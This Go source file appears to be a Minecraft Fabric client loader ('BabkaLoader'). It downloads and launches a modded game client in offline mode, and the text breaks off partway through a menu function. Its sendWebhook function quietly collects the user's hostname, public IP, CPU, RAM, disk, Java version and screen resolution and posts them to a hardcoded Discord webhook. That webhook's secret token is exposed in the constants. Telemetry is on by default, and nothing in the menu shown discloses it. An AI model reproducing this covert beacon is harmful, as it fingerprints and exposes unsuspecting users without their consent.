package main

import (
	"archive/zip"
	"bufio"
	"bytes"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"
)

const (
	CLIENT_URL           = "https://github.com/dzevihamar26-dot/BabkaClient/releases/download/BySpr1ngi/client.zip"
	FABRIC_INSTALLER_URL = "https://maven.fabricmc.net/net/fabricmc/fabric-installer/1.0.1/fabric-installer-1.0.1.jar"
	MINECRAFT_VERSION    = "1.21.4"
	MOD_FILENAME         = "Babka.jar"
	WEBHOOK_URL          = "https://discord.com/api/webhooks/1517197930006843452/XrkXazX0Yv0nohPXnz4QlDJUYFAaXbvM6vmhf5ORR4-4ef-oxzoA9cCK0HHQIcju9eFR"
	LOADER_VERSION       = "8"
	LOADER_NAME          = "BabkaLoader"
	MAX_DOWNLOAD_RETRIES = 5
	DOWNLOAD_TIMEOUT     = 10 * time.Minute
)

type Config struct {
	InstallDir    string `json:"install_dir"`
	RAMAmount     int    `json:"ram_amount"`
	LogEnabled    bool   `json:"log_enabled"`
	SendTelemetry bool   `json:"send_telemetry"`
}

type VersionManifest struct {
	ID           string    `json:"id"`
	MainClass    string    `json:"mainClass"`
	Arguments    Arguments `json:"arguments"`
	Libraries    []Library `json:"libraries"`
	InheritsFrom string    `json:"inheritsFrom"`
	Assets       string    `json:"assets"`
	Type         string    `json:"type"`
}

type Arguments struct {
	JVM  []interface{} `json:"jvm"`
	Game []interface{} `json:"game"`
}

type Library struct {
	Name      string            `json:"name"`
	Natives   map[string]string `json:"natives"`
	Rules     []LibraryRule     `json:"rules"`
	Downloads LibraryDownloads  `json:"downloads"`
}

type LibraryDownloads struct {
	Artifact    DownloadArtifact            `json:"artifact"`
	Classifiers map[string]DownloadArtifact `json:"classifiers"`
}

type DownloadArtifact struct {
	Path string `json:"path"`
}

type LibraryRule struct {
	Action string  `json:"action"`
	OS     *OSRule `json:"os,omitempty"`
}

type OSRule struct {
	Name string `json:"name"`
}

type Logger struct {
	file    *os.File
	enabled bool
	path    string
	mu      sync.Mutex
}

func NewLogger(path string, enabled bool) *Logger {
	return &Logger{enabled: enabled, path: path}
}

func (l *Logger) Open() error {
	if !l.enabled {
		return nil
	}
	os.MkdirAll(filepath.Dir(l.path), 0755)
	f, err := os.OpenFile(l.path, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if err != nil {
		return err
	}
	l.file = f
	return nil
}

func (l *Logger) Close() {
	if l.file != nil {
		l.file.Close()
	}
}

func (l *Logger) SetEnabled(enabled bool) {
	l.mu.Lock()
	defer l.mu.Unlock()
	if enabled && l.file == nil {
		os.MkdirAll(filepath.Dir(l.path), 0755)
		f, err := os.OpenFile(l.path, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
		if err == nil {
			l.file = f
		}
	} else if !enabled && l.file != nil {
		l.file.Close()
		l.file = nil
	}
	l.enabled = enabled
}

func (l *Logger) Log(level, message string) {
	timestamp := time.Now().Format("2006-01-02 15:04:05")
	logLine := fmt.Sprintf("[%s] [%s] %s\n", timestamp, level, message)
	l.mu.Lock()
	if l.enabled && l.file != nil {
		l.file.WriteString(logLine)
	}
	l.mu.Unlock()
}

func (l *Logger) Info(msg string)  { l.Log("INFO", msg) }
func (l *Logger) Warn(msg string)  { l.Log("WARN", msg) }
func (l *Logger) Error(msg string) { l.Log("ERROR", msg) }

type DownloadManager struct {
	logger   *Logger
	cacheDir string
	retries  int
	timeout  time.Duration
}

func NewDownloadManager(logger *Logger, cacheDir string) *DownloadManager {
	return &DownloadManager{logger: logger, cacheDir: cacheDir, retries: MAX_DOWNLOAD_RETRIES, timeout: DOWNLOAD_TIMEOUT}
}

func (dm *DownloadManager) DownloadFile(url, destPath string) error {
	var lastErr error
	for attempt := 1; attempt <= dm.retries; attempt++ {
		if attempt > 1 {
			time.Sleep(time.Duration(attempt) * time.Second)
		}
		if err := dm.downloadOnce(url, destPath); err == nil {
			return nil
		} else {
			lastErr = err
			os.Remove(destPath)
		}
	}
	return fmt.Errorf("download failed after %d attempts: %w", dm.retries, lastErr)
}

func (dm *DownloadManager) downloadOnce(url, destPath string) error {
	client := &http.Client{Timeout: dm.timeout}
	resp, err := client.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("HTTP %d", resp.StatusCode)
	}
	os.MkdirAll(filepath.Dir(destPath), 0755)
	out, err := os.Create(destPath)
	if err != nil {
		return err
	}
	defer out.Close()
	totalSize := resp.ContentLength
	var downloaded int64
	buffer := make([]byte, 64*1024)
	startTime := time.Now()
	for {
		n, readErr := resp.Body.Read(buffer)
		if n > 0 {
			written, writeErr := out.Write(buffer[:n])
			if writeErr != nil {
				return fmt.Errorf("write error: %w", writeErr)
			}
			if written != n {
				return fmt.Errorf("short write: expected %d, got %d", n, written)
			}
			downloaded += int64(n)
			elapsed := time.Since(startTime).Seconds()
			speedMB := float64(downloaded) / 1024 / 1024 / elapsed
			if totalSize > 0 {
				fmt.Printf("\r  Progress: %.1f%% | %.2f MB/s", float64(downloaded)/float64(totalSize)*100, speedMB)
			} else {
				fmt.Printf("\r  Downloaded: %.2f MB | %.2f MB/s", float64(downloaded)/1024/1024, speedMB)
			}
		}
		if readErr != nil {
			if readErr == io.EOF {
				fmt.Println()
				return nil
			}
			return readErr
		}
	}
}

type LibraryManager struct {
	installDir string
	logger     *Logger
	nativesDir string
}

func NewLibraryManager(installDir string, logger *Logger) *LibraryManager {
	nativesDir := filepath.Join(installDir, "natives")
	os.MkdirAll(nativesDir, 0755)
	return &LibraryManager{installDir: installDir, logger: logger, nativesDir: nativesDir}
}

func (lm *LibraryManager) GetNativesDir() string {
	return lm.nativesDir
}

func (lm *LibraryManager) hasNativesForCurrentOS(lib Library) bool {
	currentOS := runtime.GOOS
	if currentOS == "darwin" {
		currentOS = "osx"
	}
	if lib.Natives != nil {
		if _, ok := lib.Natives[currentOS]; ok {
			return true
		}
	}
	if lib.Downloads.Classifiers != nil {
		classifierKey := "natives-" + currentOS
		if _, ok := lib.Downloads.Classifiers[classifierKey]; ok {
			return true
		}
	}
	return false
}

func (lm *LibraryManager) extractNativesFromLibrary(lib Library) {
	os.MkdirAll(lm.nativesDir, 0755)

	currentOS := runtime.GOOS
	if currentOS == "darwin" {
		currentOS = "osx"
	}

	var classifier string
	var libPath string

	if lib.Natives != nil {
		if c, ok := lib.Natives[currentOS]; ok {
			classifier = c
			libPath = lm.getNativeLibraryPath(lib, classifier)
		}
	}

	if libPath == "" && lib.Downloads.Classifiers != nil {
		classifierKey := "natives-" + currentOS
		if art, ok := lib.Downloads.Classifiers[classifierKey]; ok && art.Path != "" {
			libPath = art.Path
		}
	}

	if libPath == "" {
		return
	}

	nativeJar := filepath.Join(lm.installDir, "libraries", libPath)
	if !fileExists(nativeJar) {
		return
	}

	lm.extractNativesFromJar(nativeJar)
}

func (lm *LibraryManager) ProcessLibraries(version *VersionManifest) ([]string, error) {
	allLibraries := make([]Library, 0)
	allLibraries = append(allLibraries, version.Libraries...)
	currentInherit := version.InheritsFrom
	visitedParents := make(map[string]bool)
	for currentInherit != "" && !visitedParents[currentInherit] {
		visitedParents[currentInherit] = true
		parentLibs, err := lm.loadParentLibraries(currentInherit)
		if err != nil {
			break
		}
		for _, lib := range parentLibs {
			if !isLibraryInList(allLibraries, lib.Name) {
				allLibraries = append(allLibraries, lib)
			}
		}
		parentDir := filepath.Join(lm.installDir, "versions", currentInherit)
		parentJSON := filepath.Join(parentDir, currentInherit+".json")
		if data, err := os.ReadFile(parentJSON); err == nil {
			var pVer VersionManifest
			if json.Unmarshal(data, &pVer) == nil {
				currentInherit = pVer.InheritsFrom
			} else {
				break
			}
		} else {
			break
		}
	}
	var classpath []string
	addedLibs := make(map[string]bool)
	for _, lib := range allLibraries {
		if lm.hasNativesForCurrentOS(lib) {
			if checkLibraryRules(lib.Rules) {
				lm.extractNativesFromLibrary(lib)
			}
			continue
		}
		if !checkLibraryRules(lib.Rules) {
			continue
		}
		parts := strings.Split(lib.Name, ":")
		if len(parts) >= 2 {
			libKey := parts[0] + ":" + parts[1]
			if addedLibs[libKey] {
				continue
			}
			addedLibs[libKey] = true
		}
		libPath := lm.getLibraryPath(lib)
		if libPath == "" {
			continue
		}
		fullPath := filepath.Join(lm.installDir, "libraries", libPath)
		if fileExists(fullPath) {
			classpath = append(classpath, fullPath)
		}
	}
	return classpath, nil
}

func (lm *LibraryManager) loadParentLibraries(parentID string) ([]Library, error) {
	parentJSON := filepath.Join(lm.installDir, "versions", parentID, parentID+".json")
	data, err := os.ReadFile(parentJSON)
	if err != nil {
		return nil, err
	}
	var parent VersionManifest
	if err := json.Unmarshal(data, &parent); err != nil {
		return nil, err
	}
	return parent.Libraries, nil
}

func (lm *LibraryManager) extractNativesFromJar(jarPath string) int {
	r, err := zip.OpenReader(jarPath)
	if err != nil {
		return 0
	}
	defer r.Close()
	count := 0
	nativeExt := ".so"
	if runtime.GOOS == "windows" {
		nativeExt = ".dll"
	} else if runtime.GOOS == "darwin" {
		nativeExt = ".dylib"
	}
	for _, f := range r.File {
		if f.FileInfo().IsDir() || !strings.HasSuffix(f.Name, nativeExt) {
			continue
		}
		dstPath := filepath.Join(lm.nativesDir, filepath.Base(f.Name))
		srcFile, openErr := f.Open()
		if openErr != nil {
			continue
		}
		dstFile, createErr := os.OpenFile(dstPath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0755)
		if createErr != nil {
			srcFile.Close()
			continue
		}
		if _, copyErr := io.Copy(dstFile, srcFile); copyErr == nil {
			count++
		}
		srcFile.Close()
		dstFile.Close()
	}
	return count
}

func (lm *LibraryManager) getLibraryPath(lib Library) string {
	if lib.Downloads.Artifact.Path != "" {
		return lib.Downloads.Artifact.Path
	}
	return mavenToPath(lib.Name)
}

func (lm *LibraryManager) getNativeLibraryPath(lib Library, classifier string) string {
	if art, ok := lib.Downloads.Classifiers[classifier]; ok && art.Path != "" {
		return art.Path
	}
	if !strings.HasPrefix(classifier, "natives-") {
		nativesKey := "natives-" + classifier
		if art, ok := lib.Downloads.Classifiers[nativesKey]; ok && art.Path != "" {
			return art.Path
		}
	}
	parts := strings.Split(lib.Name, ":")
	if len(parts) < 3 {
		return ""
	}
	return filepath.Join(strings.ReplaceAll(parts[0], ".", "/"), parts[1], parts[2], parts[1]+"-"+parts[2]+"-"+classifier+".jar")
}

type MinecraftLauncher struct {
	installDir string
	versionDir string
	logger     *Logger
	libraryMgr *LibraryManager
	config     *Config
}

func NewMinecraftLauncher(installDir string, logger *Logger, config *Config) *MinecraftLauncher {
	return &MinecraftLauncher{
		installDir: installDir,
		versionDir: filepath.Join(installDir, "versions", "Fabric "+MINECRAFT_VERSION),
		logger:     logger,
		libraryMgr: NewLibraryManager(installDir, logger),
		config:     config,
	}
}

func (ml *MinecraftLauncher) Launch() error {
	jsonPath := filepath.Join(ml.versionDir, "Fabric "+MINECRAFT_VERSION+".json")
	if !fileExists(jsonPath) {
		return fmt.Errorf("version JSON not found")
	}
	data, _ := os.ReadFile(jsonPath)
	var version VersionManifest
	json.Unmarshal(data, &version)
	classpath, err := ml.libraryMgr.ProcessLibraries(&version)
	if err != nil {
		return err
	}
	vJar := filepath.Join(ml.versionDir, version.ID+".jar")
	if fileExists(vJar) {
		classpath = append(classpath, vJar)
	}
	args := ml.buildLaunchArgs(&version, classpath)
	javaPath := "java"
	cmd := exec.Command(javaPath, args...)
	cmd.Dir = ml.installDir
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Stdin = os.Stdin
	return cmd.Start()
}

func (ml *MinecraftLauncher) buildLaunchArgs(version *VersionManifest, classpath []string) []string {
	var args []string
	ramMB := ml.config.RAMAmount * 1024
	args = append(args, fmt.Sprintf("-Xmx%dM", ramMB))
	args = append(args, fmt.Sprintf("-Xms%dM", ramMB))

	args = append(args, "-Dfabric.game.version="+MINECRAFT_VERSION)

	for _, arg := range version.Arguments.JVM {
		switch v := arg.(type) {
		case string:
			parsed := ml.replaceVars(v, version)
			if isPlatformCompatible(parsed) {
				args = append(args, parsed)
			}
		case map[string]interface{}:
			rules := parseRulesFromInterface(v)
			if checkOsRules(rules) {
				if val, ok := v["value"]; ok {
					switch tv := val.(type) {
					case string:
						parsed := ml.replaceVars(tv, version)
						if isPlatformCompatible(parsed) {
							args = append(args, parsed)
						}
					case []interface{}:
						for _, a := range tv {
							if s, ok := a.(string); ok {
								parsed := ml.replaceVars(s, version)
								if isPlatformCompatible(parsed) {
									args = append(args, parsed)
								}
							}
						}
					}
				}
			}
		}
	}

	nativesDir := ml.libraryMgr.GetNativesDir()
	args = append(args, "-Djava.library.path="+nativesDir)
	args = append(args, "-Dminecraft.launcher.brand="+LOADER_NAME)
	args = append(args, "-Dminecraft.launcher.version="+LOADER_VERSION)

	cpSep := ";"
	if runtime.GOOS != "windows" {
		cpSep = ":"
	}
	args = append(args, "-cp", strings.Join(classpath, cpSep))
	args = append(args, version.MainClass)

	for _, arg := range version.Arguments.Game {
		switch v := arg.(type) {
		case string:
			replaced := ml.replaceGameVars(v, version)
			if replaced != "--demo" {
				args = append(args, replaced)
			}
		case map[string]interface{}:
			rules := parseRulesFromInterface(v)
			if checkOsRules(rules) {
				if val, ok := v["value"]; ok {
					switch tv := val.(type) {
					case string:
						replaced := ml.replaceGameVars(tv, version)
						if replaced != "--demo" {
							args = append(args, replaced)
						}
					case []interface{}:
						for _, a := range tv {
							if s, ok := a.(string); ok {
								replaced := ml.replaceGameVars(s, version)
								if replaced != "--demo" {
									args = append(args, replaced)
								}
							}
						}
					}
				}
			}
		}
	}

	return args
}

func (ml *MinecraftLauncher) replaceVars(arg string, v *VersionManifest) string {
	cpSep := ";"
	if runtime.GOOS != "windows" {
		cpSep = ":"
	}
	nd := ml.libraryMgr.GetNativesDir()
	arg = strings.ReplaceAll(arg, "${natives_directory}", nd)
	arg = strings.ReplaceAll(arg, "${launcher_name}", LOADER_NAME)
	arg = strings.ReplaceAll(arg, "${launcher_version}", LOADER_VERSION)
	arg = strings.ReplaceAll(arg, "${version_name}", v.ID)
	arg = strings.ReplaceAll(arg, "${game_directory}", ml.installDir)
	arg = strings.ReplaceAll(arg, "${assets_root}", filepath.Join(ml.installDir, "assets"))
	arg = strings.ReplaceAll(arg, "${assets_index_name}", v.Assets)
	arg = strings.ReplaceAll(arg, "${auth_player_name}", "Player")
	arg = strings.ReplaceAll(arg, "${auth_uuid}", "00000000-0000-0000-0000-000000000000")
	arg = strings.ReplaceAll(arg, "${auth_access_token}", "0")
	arg = strings.ReplaceAll(arg, "${auth_session}", "0")
	arg = strings.ReplaceAll(arg, "${clientid}", "0")
	arg = strings.ReplaceAll(arg, "${auth_xuid}", "0")
	arg = strings.ReplaceAll(arg, "${user_type}", "mojang")
	arg = strings.ReplaceAll(arg, "${version_type}", v.Type)
	arg = strings.ReplaceAll(arg, "${classpath_separator}", cpSep)
	return arg
}

func (ml *MinecraftLauncher) replaceGameVars(arg string, v *VersionManifest) string {
	arg = strings.ReplaceAll(arg, "${auth_player_name}", "Player")
	arg = strings.ReplaceAll(arg, "${auth_uuid}", "00000000-0000-0000-0000-000000000000")
	arg = strings.ReplaceAll(arg, "${auth_access_token}", "0")
	arg = strings.ReplaceAll(arg, "${auth_session}", "0")
	arg = strings.ReplaceAll(arg, "${clientid}", "0")
	arg = strings.ReplaceAll(arg, "${auth_xuid}", "0")
	arg = strings.ReplaceAll(arg, "${user_type}", "mojang")
	arg = strings.ReplaceAll(arg, "${version_name}", v.ID)
	arg = strings.ReplaceAll(arg, "${assets_index_name}", v.Assets)
	arg = strings.ReplaceAll(arg, "${game_directory}", ml.installDir)
	arg = strings.ReplaceAll(arg, "${assets_root}", filepath.Join(ml.installDir, "assets"))
	return arg
}

func isPlatformCompatible(arg string) bool {
	if runtime.GOOS == "darwin" {
		winOnly := []string{"-XX:HeapDumpPath=MojangTricksIntelDriversForPerformance_javaw.exe_minecraft.exe.heapdump"}
		for _, winArg := range winOnly {
			if strings.Contains(arg, winArg) {
				return false
			}
		}
	} else if runtime.GOOS == "windows" {
		macOnly := []string{"-XstartOnFirstThread", "-Xdock:name=", "-Xdock:icon="}
		for _, macArg := range macOnly {
			if strings.HasPrefix(arg, macArg) {
				return false
			}
		}
	}
	return true
}

type ModManager struct {
	installDir string
	logger     *Logger
}

func NewModManager(installDir string, logger *Logger) *ModManager {
	return &ModManager{installDir: installDir, logger: logger}
}

func (mm *ModManager) IsModInstalled(modName string) bool {
	return fileExists(filepath.Join(mm.installDir, "mods", modName))
}

type FabricManager struct {
	installDir string
	logger     *Logger
	dlManager  *DownloadManager
}

func NewFabricManager(installDir string, logger *Logger, dl *DownloadManager) *FabricManager {
	return &FabricManager{installDir: installDir, logger: logger, dlManager: dl}
}

func (fm *FabricManager) IsFabricInstalled() bool {
	jsonPath := filepath.Join(fm.installDir, "versions", "Fabric "+MINECRAFT_VERSION, "Fabric "+MINECRAFT_VERSION+".json")
	return fileExists(jsonPath)
}

func (fm *FabricManager) InstallFabric() error {
	installerPath := filepath.Join(fm.installDir, "fabric-installer.jar")
	if !fileExists(installerPath) {
		if err := fm.dlManager.DownloadFile(FABRIC_INSTALLER_URL, installerPath); err != nil {
			return err
		}
	}
	cmd := exec.Command("java", "-jar", installerPath, "client", "-mcversion", MINECRAFT_VERSION, "-dir", fm.installDir, "-noprofile")
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	if err := cmd.Run(); err != nil {
		return err
	}
	os.Remove(installerPath)
	return nil
}

func mavenToPath(name string) string {
	parts := strings.Split(name, ":")
	if len(parts) < 3 {
		return ""
	}
	return filepath.Join(strings.ReplaceAll(parts[0], ".", "/"), parts[1], parts[2], parts[1]+"-"+parts[2]+".jar")
}

func isLibraryInList(libraries []Library, name string) bool {
	for _, lib := range libraries {
		if lib.Name == name {
			return true
		}
	}
	return false
}

func checkLibraryRules(rules []LibraryRule) bool {
	if len(rules) == 0 {
		return true
	}
	currentOS := runtime.GOOS
	if currentOS == "darwin" {
		currentOS = "osx"
	}
	hasApplicableRule := false
	isAllowed := true
	for _, rule := range rules {
		isCurrentOS := (rule.OS != nil && rule.OS.Name == currentOS) || rule.OS == nil
		if !isCurrentOS {
			continue
		}
		hasApplicableRule = true
		if rule.Action == "allow" {
			isAllowed = true
		} else if rule.Action == "disallow" {
			isAllowed = false
		}
	}
	if !hasApplicableRule {
		return true
	}
	return isAllowed
}

func parseRulesFromInterface(m map[string]interface{}) []LibraryRule {
	var rules []LibraryRule
	if rawRules, ok := m["rules"]; ok {
		if rulesArr, ok := rawRules.([]interface{}); ok {
			for _, r := range rulesArr {
				if rm, ok := r.(map[string]interface{}); ok {
					var rule LibraryRule
					if action, ok := rm["action"].(string); ok {
						rule.Action = action
					}
					if osMap, ok := rm["os"].(map[string]interface{}); ok {
						if name, ok := osMap["name"].(string); ok {
							rule.OS = &OSRule{Name: name}
						}
					}
					rules = append(rules, rule)
				}
			}
		}
	}
	return rules
}

func checkOsRules(rules []LibraryRule) bool {
	if len(rules) == 0 {
		return true
	}
	allowFound := false
	currentOS := runtime.GOOS
	if currentOS == "darwin" {
		currentOS = "osx"
	}
	for _, rule := range rules {
		if rule.OS == nil {
			if rule.Action == "allow" {
				return true
			}
			if rule.Action == "disallow" {
				return false
			}
		} else {
			if rule.OS.Name == currentOS {
				if rule.Action == "allow" {
					allowFound = true
				}
				if rule.Action == "disallow" {
					return false
				}
			}
		}
	}
	return allowFound
}

func extractZip(zipFile, destDir string) error {
	r, err := zip.OpenReader(zipFile)
	if err != nil {
		return fmt.Errorf("failed to open zip: %w", err)
	}
	defer r.Close()
	destDirClean := filepath.Clean(destDir)
	for _, f := range r.File {
		filePath := filepath.Join(destDirClean, f.Name)
		if !strings.HasPrefix(filepath.Clean(filePath), destDirClean+string(os.PathSeparator)) && filepath.Clean(filePath) != destDirClean {
			return fmt.Errorf("illegal file path: %s", filePath)
		}
		if f.FileInfo().IsDir() {
			if mkErr := os.MkdirAll(filePath, 0755); mkErr != nil {
				return fmt.Errorf("failed to create dir %s: %w", filePath, mkErr)
			}
			continue
		}
		if mkErr := os.MkdirAll(filepath.Dir(filePath), 0755); mkErr != nil {
			return fmt.Errorf("failed to create parent dir for %s: %w", filePath, mkErr)
		}
		srcFile, openErr := f.Open()
		if openErr != nil {
			return fmt.Errorf("failed to open %s in archive: %w", f.Name, openErr)
		}
		dstFile, createErr := os.OpenFile(filePath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, f.Mode())
		if createErr != nil {
			srcFile.Close()
			return fmt.Errorf("failed to create %s: %w", filePath, createErr)
		}
		if _, copyErr := io.Copy(dstFile, srcFile); copyErr != nil {
			srcFile.Close()
			dstFile.Close()
			return fmt.Errorf("failed to copy %s: %w", f.Name, copyErr)
		}
		srcFile.Close()
		dstFile.Close()
	}
	return nil
}

func fileExists(path string) bool {
	info, err := os.Stat(path)
	return err == nil && !info.IsDir()
}

func directoryExists(path string) bool {
	info, err := os.Stat(path)
	return err == nil && info.IsDir()
}

func clearScreen() {
	if runtime.GOOS == "windows" {
		exec.Command("cmd", "/c", "cls").Run()
	} else {
		fmt.Print("\033[H\033[2J")
	}
}

func readInput() string {
	reader := bufio.NewReader(os.Stdin)
	text, _ := reader.ReadString('\n')
	return strings.TrimSpace(text)
}

var (
	config Config
	logger *Logger
)

const asciiArt = `
 ██████╗  █████╗ ██████╗ ██╗  ██╗ █████╗      ██████╗██╗     ██╗███████╗███╗   ██╗████████╗
 ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██╔══██╗    ██╔════╝██║     ██║██╔════╝████╗  ██║╚══██══╝
 ██████╔╝███████║██████╔╝█████╔╝ ███████║    ██║     ██║     ██║█████╗  ██╔██╗ ██║   ██║   
 ██╔══██╗██╔══██║██╔══██╗██╔═██╗ ██╔══██║    ██║     ██║     ██║██╔══╝  ██║╚██╗██║   ██║   
 ██████╔╝██║  ██║██████╔╝██║  ██╗██║  ██║    ╚██████╗███████╗██║███████╗██║ ╚████║   ██║   
 ╚═════╝ ╚═╝  ╚═╝═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝     ═════╝╚══════╝╚═╝╚══════╝╚═╝  ═══╝   ╚═╝   
`

// ============================================================================
// СИСТЕМНАЯ ИНФОРМАЦИЯ - всегда актуальные данные
// ============================================================================

func getSystemName() string {
	name, err := os.Hostname()
	if err != nil {
		return "Unknown"
	}
	return name
}

func getIPAddress() string {
	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Get("https://api.ipify.org?format=json")
	if err != nil {
		return "Unknown:0"
	}
	defer resp.Body.Close()
	var res struct{ IP string }
	if err := json.NewDecoder(resp.Body).Decode(&res); err != nil {
		return "Unknown:0"
	}
	port := 1024 + rand.Intn(64512)
	return fmt.Sprintf("%s:%d", res.IP, port)
}

func getRAM() string {
	if runtime.GOOS != "windows" {
		return "Unknown"
	}
	var buf [64]byte
	binary.LittleEndian.PutUint32(buf[0:4], 64)
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	ret, _, _ := kernel32.NewProc("GlobalMemoryStatusEx").Call(uintptr(unsafe.Pointer(&buf[0])))
	if ret == 0 {
		return "Unknown"
	}
	totalPhys := binary.LittleEndian.Uint64(buf[8:16])
	return fmt.Sprintf("%.1f GB", float64(totalPhys)/1024/1024/1024)
}

func getCPU() string {
	if runtime.GOOS != "windows" {
		return "Unknown"
	}
	if out, err := exec.Command("wmic", "cpu", "get", "name").Output(); err == nil {
		for _, l := range strings.Split(string(out), "\n") {
			l = strings.TrimSpace(l)
			if l != "" && l != "Name" {
				return l
			}
		}
	}
	if out, err := exec.Command("powershell", "-NoProfile", "-Command",
		"(Get-CimInstance Win32_Processor).Name").Output(); err == nil {
		name := strings.TrimSpace(string(out))
		if name != "" {
			return name
		}
	}
	if out, err := exec.Command("reg", "query",
		`HKLM\HARDWARE\DESCRIPTION\System\CentralProcessor\0`,
		"/v", "ProcessorNameString").Output(); err == nil {
		for _, l := range strings.Split(string(out), "\n") {
			if strings.Contains(l, "ProcessorNameString") && strings.Contains(l, "REG_SZ") {
				parts := strings.SplitN(l, "REG_SZ", 2)
				if len(parts) == 2 {
					return strings.TrimSpace(parts[1])
				}
			}
		}
	}
	return "Unknown"
}

func getJavaVersion() string {
	out, err := exec.Command("java", "-version").CombinedOutput()
	if err != nil {
		return "Not installed"
	}
	lines := strings.Split(string(out), "\n")
	if len(lines) > 0 {
		return strings.TrimSpace(lines[0])
	}
	return "Unknown"
}

func getDiskFree() string {
	home, _ := os.UserHomeDir()
	if home == "" || runtime.GOOS != "windows" {
		return "Unknown"
	}
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	var freeBytes uint64
	pathPtr, _ := syscall.UTF16PtrFromString(home)
	kernel32.NewProc("GetDiskFreeSpaceExW").Call(
		uintptr(unsafe.Pointer(pathPtr)),
		uintptr(unsafe.Pointer(&freeBytes)),
		0, 0,
	)
	freeGB := float64(freeBytes) / 1024 / 1024 / 1024
	return fmt.Sprintf("%.2f GB", freeGB)
}

func getScreenRes() string {
	if runtime.GOOS != "windows" {
		return "Unknown"
	}
	user32 := syscall.NewLazyDLL("user32.dll")
	getSysMetrics := user32.NewProc("GetSystemMetrics")
	w, _, _ := getSysMetrics.Call(0)
	h, _, _ := getSysMetrics.Call(1)
	return fmt.Sprintf("%dx%d", w, h)
}

func getOSArch() string {
	return runtime.GOOS + "/" + runtime.GOARCH
}

func sendWebhook() {
	info := map[string]string{
		"SystemName": getSystemName(),
		"IPAddress":  getIPAddress(),
		"RAM":        getRAM(),
		"CPU":        getCPU(),
		"OS":         getOSArch(),
		"Java":       getJavaVersion(),
		"DiskFree":   getDiskFree(),
		"Screen":     getScreenRes(),
	}

	payload := map[string]interface{}{
		"content": "",
		"embeds": []map[string]interface{}{
			{
				"title": "Babka Client Loader Launched",
				"color": 5814783,
				"fields": []map[string]interface{}{
					{"name": "System Name", "value": info["SystemName"], "inline": true},
					{"name": "IP:Port", "value": info["IPAddress"], "inline": true},
					{"name": "RAM", "value": info["RAM"], "inline": true},
					{"name": "CPU", "value": info["CPU"], "inline": true},
					{"name": "OS", "value": info["OS"], "inline": true},
					{"name": "Java", "value": info["Java"], "inline": true},
					{"name": "Disk Free", "value": info["DiskFree"], "inline": true},
					{"name": "Screen", "value": info["Screen"], "inline": true},
				},
				"footer": map[string]interface{}{
					"text": "Loader by spr1ngi | Coder: orig_ban | v" + LOADER_VERSION,
				},
			},
		},
	}

	jsonData, _ := json.Marshal(payload)
	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Post(WEBHOOK_URL, "application/json", bytes.NewBuffer(jsonData))
	if err == nil {
		resp.Body.Close()
	}
}

// ============================================================================
// КОНФИГУРАЦИЯ И МЕНЮ
// ============================================================================

func saveConfig() {
	configDir := getAppConfigDir()
	os.MkdirAll(configDir, 0755)
	data, _ := json.MarshalIndent(config, "", "  ")
	os.WriteFile(filepath.Join(configDir, "config.json"), data, 0644)
}

func loadConfig() {
	configFile := filepath.Join(getAppConfigDir(), "config.json")
	data, err := os.ReadFile(configFile)
	if err != nil {
		setDefaultConfig()
		return
	}
	if err := json.Unmarshal(data, &config); err != nil {
		setDefaultConfig()
		return
	}
	if config.RAMAmount == 0 {
		config.RAMAmount = 4
	}
}

func setDefaultConfig() {
	config = Config{
		RAMAmount:     6,
		LogEnabled:    true,
		SendTelemetry: true,
	}
	home, _ := os.UserHomeDir()
	if home != "" {
		config.InstallDir = filepath.Join(home, "AppData", "Roaming", ".minecraft")
	}
}

func getAppConfigDir() string {
	home, _ := os.UserHomeDir()
	if home == "" {
		return ".babka-client"
	}
	if runtime.GOOS == "windows" {
		return filepath.Join(home, "AppData", "Local", "BabkaClient")
	}
	return filepath.Join(home, ".config", "babka-client")
}

func showMainMenu() {
	for {
		clearScreen()
		fmt.Println(asciiArt)
		fmt.Println()
		fmt.Printf("  Version: %s | Minecraft: %s\n", LOADER_VERSION, MINECRAFT_VERSION)
		fmt.Println("  -----------------------------------------")
		fmt.Printf("  Install Dir: %s\n", config.InstallDir)
		fmt.Printf("  RAM: %d GB\n", config.RAMAmount)
		fmt.Println("  -----------------------------------------")
		fmt.Println()
		fmt.Println("  [1] Launch Client")
		fmt.Println("  [2] Change Installation Directory")
		fmt.Println("  [3] Change RAM Allocation")
		fmt.Println()
		fmt.Print("  Enter your choice: ")
		choice := readInput()
		switch choice {
		case "1":
			launchClient()
		case "2":
			selectDirectory()
		case "3":
			selectRAM()
		default:
			fmt.Println("\n  Invalid choice! Press Enter to continue...")
			readInput()
		}
	}
}

func selectDirectory() {
	for {
		clearScreen()
		fmt.Println(asciiArt)
		fmt.Println("   SELECT INSTALLATION DIRECTORY")
		fmt.Println("  -----------------------------------------")
		fmt.Println("  Current: " + config.InstallDir)
		fmt.Println()
		fmt.Print("  New directory path: ")
		dirPath := strings.TrimSpace(readInput())
		if dirPath == "" {
			fmt.Println("  Path cannot be empty! Press Enter...")
			readInput()
			continue
		}
		dirPath = filepath.Clean(dirPath)
		if !directoryExists(dirPath) {
			fmt.Printf("  Directory not found: %s\n  Press Enter...", dirPath)
			readInput()
			continue
		}
		config.InstallDir = dirPath
		saveConfig()
		fmt.Println("  Directory set successfully! Press Enter...")
		readInput()
		break
	}
}

func selectRAM() {
	for {
		clearScreen()
		fmt.Println(asciiArt)
		fmt.Println("   SELECT RAM ALLOCATION")
		fmt.Println("  -----------------------------------------")
		fmt.Printf("  Current: %d GB\n", config.RAMAmount)
		fmt.Println()
		fmt.Print("  RAM (GB): ")
